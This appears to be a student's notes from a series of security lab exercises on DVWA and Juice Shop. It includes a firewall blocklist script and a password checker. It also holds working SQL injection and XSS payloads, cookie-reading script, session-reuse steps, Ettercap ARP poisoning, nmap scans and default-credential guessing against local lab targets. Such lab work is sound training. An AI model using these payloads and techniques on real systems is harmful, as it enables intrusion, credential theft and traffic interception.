# DVWA
```bash
docker run -it -p 8080:80 vulnerables/web-dvwa
```

# JS
```bash
docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
```

---

# FIREWALL

## firewall.py
```python
import requests
import csv
import subprocess

# Feodo Tracker IP Blocklist URL
url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"

# Download CSV file
response = requests.get(url)

# Delete old firewall rules named "BadIP"
subprocess.run(
    [
        "powershell",
        "-Command",
        "netsh advfirewall firewall delete rule name='BadIP'"
    ]
)

# Read CSV while ignoring comment lines starting with '#'
mycsv = csv.reader(
    filter(
        lambda x: not x.startswith("#"),
        response.text.splitlines()
    )
)

# Process each row
for row in mycsv:

    # Extract destination IP column
    ip = row[1].strip()

    # Skip header row
    if ip != "dst_ip":

        # Outbound block rule
        rule_out = (
            f"netsh advfirewall firewall add rule "
            f"name='BadIP' "
            f"dir=out "
            f"action=block "
            f"remoteip={ip}"
        )

        # Inbound block rule
        rule_in = (
            f"netsh advfirewall firewall add rule "
            f"name='BadIP' "
            f"dir=in "
            f"action=block "
            f"remoteip={ip}"
        )

        # Execute firewall rules
        subprocess.run(["powershell", "-Command", rule_out])
        subprocess.run(["powershell", "-Command", rule_in])

        print(f"[+] Blocked IP: {ip}")

print("\nAll malicious IPs have been blocked.")
```

## Install Required Package
```bash
pip install requests
```

## Run the Script
Run Command Prompt or PowerShell as Administrator:

```bash
python firewall.py
```

---

# PASSWORD STRENGTH CHECK

```java
import java.util.Scanner;

public class PasswordStrengthChecker {

    public static String checkPasswordStrength(String password) {

        int strength = 0;

        // Length check
        if (password.length() >= 8) {
            strength++;
        }

        // Uppercase check
        if (password.matches(".*[A-Z].*")) {
            strength++;
        }

        // Lowercase check
        if (password.matches(".*[a-z].*")) {
            strength++;
        }

        // Number check
        if (password.matches(".*[0-9].*")) {
            strength++;
        }

        // Special character check
        if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
            strength++;
        }

        // Strength evaluation
        if (strength == 5) {
            return "Very Strong Password";
        }
        else if (strength == 4) {
            return "Strong Password";
        }
        else if (strength == 3) {
            return "Medium Password";
        }
        else if (strength == 2) {
            return "Weak Password";
        }
        else {
            return "Very Weak Password";
        }
    }

    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        System.out.print("Enter Password: ");
        String password = sc.nextLine();

        String result = checkPasswordStrength(password);

        System.out.println("Password Strength: " + result);

        sc.close();
    }
}
```

---

# PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS

## Open terminal and start HTTP server
```bash
python3 -m http.server 8080
```

## Open another terminal and start packet capture
```bash
sudo tcpdump -i any -w capture.pcap port 8080
```

## Open browser and access
```text
http://localhost:8080
```

## Stop capturing using
```text
Ctrl + C
```

## Open capture file in Wireshark
```bash
wireshark capture.pcap
```

## Apply filter in Wireshark
```text
http.request.method == "GET"
```

---

# SQL Injection Attack

## Install DVWA
```bash
sudo apt update
sudo apt install dvwa -y
```

## Start services
```bash
sudo service apache2 start
sudo service mysql start
```

## Open DVWA
```text
http://127.0.0.1/dvwa
```

## Normal Input
```text
1
```

## Authentication Bypass
```sql
1' OR '1'='1
```

## Find Columns
```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

## UNION Injection
```sql
1' UNION SELECT 1,2-- -
```

## Database Name
```sql
1' UNION SELECT database(),2-- -
```

## Table Names
```sql
1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema=database()-- -
```

## Column Names
```sql
1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'-- -
```

## Extract Usernames and Passwords
```sql
1' UNION SELECT user,password FROM users-- -
```

---

# Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux

## Start Apache
```bash
sudo service apache2 start
```

## Start MySQL
```bash
sudo service mysql start
```

```text
http://localhost/dvwa
```

## Reflected XSS
```html
<script>alert('XSS')</script>
```

## Stored XSS
```html
<h1>Hacked</h1>

<script>alert('Stored XSS')</script>
```

## DOM XSS
```html
#<script>alert('DOM XSS')</script>
```

## Cookie Demo
```html
<script>alert(document.cookie)</script>
```

---

# Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA

## Step 1
Start services.

```bash
sudo service apache2 start
sudo service mysql start
```

## Step 2
Open:

```text
http://127.0.0.1/dvwa
```

Login:

```text
Username: admin
Password: password
```

## Step 3
Set DVWA Security Level = LOW.

## Step 4
Open:

```text
DVWA → Vulnerabilities → Brute Force
```

Try:

```text
admin / admin
admin / 123456
admin / password
```

## Step 5
Check Cookies:

```text
Inspect → Storage → Cookies
```

## Step 6
Copy PHPSESSID.

Open Private Window:

```text
Ctrl + Shift + P
```

Paste same PHPSESSID and refresh page.

## Step 7
Check PHPSESSID before and after login.

## Step 8
Logout from DVWA.

Reuse old PHPSESSID in Private Window.

---

# Ettercap

## Check IP Address
```bash
ifconfig
```

IP Address:

```text
192.168.0.103
```

## Open Ettercap
```bash
ettercap -G
```

## Scan for Hosts
```text
Hosts → Scan for Hosts
```

## Open Hosts List
```text
Hosts → Hosts List
```

## Add Devices
```text
Add to Target 1
Add to Target 2
```

## View Current Targets
```text
Targets → Current Targets
```

## Start ARP Poisoning
```text
MITM → ARP Poisoning
```

## Enable
```text
Sniff Remote Connections
```

## Start Attack
```text
Click OK
```

## Observation
ARP poisoning attack starts between victims.

---

# TESTING IoT DEVICE SECURITY (DEFAULT PASSWORDS & OPEN PORTS)

## A. DEPLOY VULNERABLE IoT SIMULATION (DOCKER)

```bash
docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
docker ps
docker logs juiceshop
```

## B. ACCESS APPLICATION (VERIFY DEPLOYMENT)

```text
http://localhost:8090
```

## C. IDENTIFY HOST IP ADDRESS

### Windows
```bash
ipconfig
```

### Linux/macOS
```bash
ifconfig
```

## D. NETWORK SCANNING FROM KALI LINUX

```bash
nmap 10.39.169.126
nmap -sV 10.39.169.126
nmap -A 10.39.169.126
```

## E. PORT + SERVICE ENUMERATION

```bash
nmap -p- 10.39.169.126
nmap -sC -sV 10.39.169.126
nmap --open 10.39.169.126
```

## F. ACCESS IoT DASHBOARD FROM ATTACKER MACHINE

```text
http://10.39.169.126:8090
```

## G. TEST DEFAULT / WEAK CREDENTIALS

```text
admin / admin
admin / password
user / user
```

## H. ANALYZE NETWORK TRAFFIC

```text
Open Browser
Press F12
Go to Network Tab
Reload page
Inspect HTTP requests
```

---

# ANALYSING ANDROID APP PERMISSIONS AND MOBILE TRAFFIC

## A. VERIFY
```bash
cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
emulator -list-avds
```

## B. SETUP PROXY
```bash
cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
adb devices
adb shell settings put global http_proxy 10.0.2.2:8080
adb shell settings get global http_proxy
```

## C. SEND CERTIFICATE TO EMULATOR
```bash
adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
```

## E. INSTALL CERTIFICATE IN EMULATOR
```text
Settings → Security → Install Certificate → Select burpcer.der
```

## F. ANALYZE APP TRAFFIC
```text
Open Android application
Observe requests in Burp Suite
```

## G. CHECK APP PERMISSIONS
```text
Settings → Apps → App Permissions
```

---

# WEB APPLICATION VULNERABILITY SCANNING WITH OWASP ZAP

## STEP 1 — Install OWASP ZAP

Download and install OWASP ZAP from:

```text
https://www.zaproxy.org/download/
```

## STEP 2 — Run OWASP Juice Shop

Open Command Prompt:

```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```

## STEP 3 — Open Juice Shop
```text
http://localhost:3000
```

## STEP 4 — Start OWASP ZAP

```text
1. Open OWASP ZAP
2. Select:
No, I do not want to persist this session
3. Click Start
```

## STEP 5 — Configure Proxy

```text
HTTP Proxy : 127.0.0.1
Port : 8080
```

## STEP 6 — Perform Spider Scan

```text
1. Right-click:
http://localhost:3000
2. Select:
Attack → Spider
3. Start Scan
```

## STEP 7 — Perform Active Scan

```text
1. Right-click:
http://localhost:3000
2. Select:
Attack → Active Scan
3. Start Scan
```

## STEP 8 — Analyze Alerts

```text
Open Alerts tab to view vulnerabilities like:
• XSS
• Missing Security Headers
• Cookie Issues
```

## STEP 9 — Generate Report

```text
Go to:
Report → Generate Report
Save report in HTML/PDF format.
```
